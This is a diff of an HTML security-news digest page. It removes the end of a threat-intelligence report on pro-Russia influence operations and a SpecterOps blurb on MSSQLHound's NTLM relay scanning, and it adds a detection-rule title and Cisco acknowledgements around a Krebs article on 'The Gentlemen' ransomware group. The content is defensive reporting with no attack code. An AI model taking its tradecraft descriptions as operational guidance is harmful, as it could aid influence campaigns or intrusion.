-The hacktivist persona JokerDNR played a significant role in amplifying the APT44-linked persona Solntsepek when its doxxing-focused Telegram channel first launched and then again as it began claiming cyber espionage activity.
-Domestic Russian audiences are a longstanding target of the pro-Russia influence ecosystem. Internally directed [influence activity](https://blog.google/threat-analysis-group/prigozhin-interests-and-russian-information-operations/) has often involved the promotion of Kremlin policies and talking points and the denigration of opposition voices and ideas, conducted by both overt and covert segments of the ecosystem.
--
-Ahead of Russia’s March 2024 presidential election, GTIG identified the hybrid espionage and influence actor UNC5101 register domains and conduct associated influence operations attempting to deceive Russian opposition voters about the timing of an anti-Putin protest.
-Ecosystem actors respond to the same set of internal shifting circumstances and external geopolitical developments, often leading to seemingly similar, but ultimately distinct, activity. These shared drivers and general motivational alignments encourage actors to "spontaneously" coalesce around a particular topic or narrative. While this can appear superficially similar, this phenomenon is distinct from instances of actor coordination and campaign linkages, which is less common.
-Systemic flexibility is a central feature, with influence assets able to mobilize both incrementally and at scale to advance Russian interests. The Russian Government is able to [mobilize assets](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine) across the ecosystem to respond to strategic events. Meanwhile, individual or aligned actors can separately mobilize to address [tactical needs](https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-information-operations-drone-incursions), allowing the ecosystem to concurrently message on multiple issues across different geographies (Figure 7).
--
-Russia demonstrated its ability to focus the ecosystem on a single strategic issue like the Russian invasion of Ukraine. Simultaneously, discrete assets have addressed tactical events, such as when Portal Kombat briefly
-[promoted](https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-information-operations-drone-incursions)narratives about a Russian drone incursion into Poland concurrently with other covert pro-Russia influence activity.
-Figure 7: Tactical responses are executed by individual or coordinated/aligned clusters of actors to address emerging developments
-Overt Russian media contributes to, and is connected with, multiple covert influence components. The overt components of Russia's influence infrastructure play a critical role within the broader Russian influence ecosystem beyond the commonly understood function of providing a public platform for government-aligned narratives and official talking points; overt media helps to drive (inform targeting) and amplify covert pro-Russia influence activity, seeding desirable narratives within the ecosystem and providing an indirect conduit between the Kremlin and a disparate array of influence actors. Overt media outlets have directly [coordinated](https://home.treasury.gov/news/press-releases/jy2559) their activity with covert actors and have increasingly employed IO tactics to disseminate their own content in the face of sanctions and platform bans (Figure 8).
--
-US Government
-[sanctions](https://home.treasury.gov/news/press-releases/jy2559)in late 2024 indicated that Russian state media company Russia Today (RT) directly conducted covert influence operations, including on behalf of the Russian intelligence services. Further, RT employees reportedly interacted with members of the self-proclaimed hacktivist group RaHDit, which has claimed to collaborate with multiple other pro-Russia hacktivist groups, illustrating the layered connections between overt media, Russian intelligence services, and hacktivist groups.
-Figure 8: Overt Russian media maintains multiple links with the covert segments of the ecosystem
-Outsourcing IO capability development and campaign execution to third-party organizations and proxies enables scaling and obfuscation. Outsourcing is used for developing [custom tooling](https://cloud.google.com/blog/topics/threat-intelligence/cyber-operations-russian-vulkan) and bolstering both human and [organizational](https://home.treasury.gov/news/press-releases/jy2559) [capacity](https://home.treasury.gov/news/press-releases/jy2195). While [custom tool](https://www.justice.gov/opa/pr/justice-department-announces-actions-combat-two-russian-state-sponsored-cyber-criminal) development facilitates operators in all phases of the IO lifecycle, Russian government actors can flexibly leverage different models for outsourcing campaign execution based on their specific needs. Proxy actors can also generate plausible deniability (Figure 9).
--
-GTIG
-[reported](https://cloud.google.com/blog/topics/threat-intelligence/cyber-operations-russian-vulkan)how Russian IT contractor NTC Vulkan (Russian: НТЦ Вулкан) worked with the Russian intelligence services, including providing tooling and support for the GRU unit that sponsors APT44 activity. Separately, US government[sanctions](https://home.treasury.gov/news/press-releases/jy2195)detailed how the Doppelganger campaign is supported by multiple Russian contractors under the sponsorship of the Russian Presidential Administration.
-Figure 9: Outsourcing and proxies support capability development and campaign execution for covert influence activity
-Conclusion
-Multiple factors are propelling the evolution of the pro-Russia influence ecosystem we have observed since Moscow’s full scale invasion of Ukraine four years ago. The Kremlin mobilized the entire ecosystem to support the ongoing conflict, which has provided rapid feedback and driven significant investment in new and established overt and covert influence assets. At the same time, pro-Russia actors are increasingly experimenting with generative AI to enhance their workflows. This condensed period of adaptation, alongside signals suggesting Russia's growing reliance on IO tactics to navigate new challenges, raises concerns regarding how a potentially diversifying pool of actors will leverage advancements in tradecraft and scalability. As Russia seeks to emerge from international isolation and reorients its influence ecosystem back toward global objectives, it is critical for defenders to understand how this ecosystem provides the Kremlin with a durable influence capability in order to better anticipate future Russian influence threats.
-Additional Tools and Resources
-For mitigation and hardening recommendations, please review the following:
--
-[How to Understand and Action Mandiant's Intelligence on Information Operations](https://cloud.google.com/blog/topics/threat-intelligence/understand-action-intelligence-information-operations) -
-[Proactive Preparation and Hardening to Protect Against Destructive Attacks](https://cloud.google.com/blog/topics/threat-intelligence/preparation-hardening-destructive-attacks) -
-[Linux Endpoint Hardening to Protect Against Malware and Destructive Attacks](https://services.google.com/fh/files/misc/linux-endpoint-hardening-wp-en.pdf) -
-[Distributed Denial of Service (DDoS) Protection Recommendations](https://services.google.com/fh/files/misc/ddos-protection-recommendations-wp-en.pdf)
-Google offers a suite of free of cost tools to help protect high-risk users from the most pervasive digital attacks, to which politicians, journalists, and campaigns are often most vulnerable. Examples include protecting accounts from targeted attacks with [Advanced Protection Program](https://landing.google.com/advancedprotection/) and safeguarding campaign websites from DDoS attacks with [Project Shield](https://projectshield.withgoogle.com/landing).</div>
+Suspicious Copy from Usr Share to User Hidden Directory
+Acknowledgements
+Mandiant would like to thank the Cisco Product Security Incident Response Team (PSIRT) for their collaboration and partnership throughout the coordinated disclosure process.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-8" class="article-body">
+        <div id="art-9" class="article-body">
             <h2 class="article-title">Who Runs the Ransomware Group ‘The Gentlemen?’</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/who-runs-the-ransomware-group-the-gentlemen/" target="_blank">Original Link</a></p>
             <div class="content-text">A cybercrime group known as The Gentlemen has emerged as the second most active ransomware gang by victim count, rapidly attracting a talented pool of hackers through an aggressive recruitment strategy that promises affiliates 90 percent of any ransom paid by victims. This post examines clues pointing to a real life identity for the administrator of The Gentlemen ransomware group.
@@ -792,17 +931,6 @@ Very interesting article, I always say there’s only one internet and there’s
 Dropping a quick note of appreciation. Superb post.
 Rare to see such a balanced take. Appreciate you putting the time into this. Take care.
 You turned what’s usually a dry topic into something readable. Saved me hours of digging around.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-9" class="article-body">
-            <h2 class="article-title">Updates to the MSSQLHound OpenGraph Collector for BloodHound</h2>
-            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/" target="_blank">Original Link</a></p>
-            <div class="content-text"><p>tl;dr: MSSQLHound, a PowerShell script that collects security information from remote MSSQL Server instances, now scans them to determine whether or not NTLM relay attacks are possible, accounts for a recent privilege escalation vulnerability, and includes queries you can import into the BloodHound attack path graph to visualize, navigate, and remediate misconfigurations in MSSQL. Updates [&#8230;]</p>
-<p>The post <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/">Updates to the MSSQLHound OpenGraph Collector for BloodHound</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
-
-[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
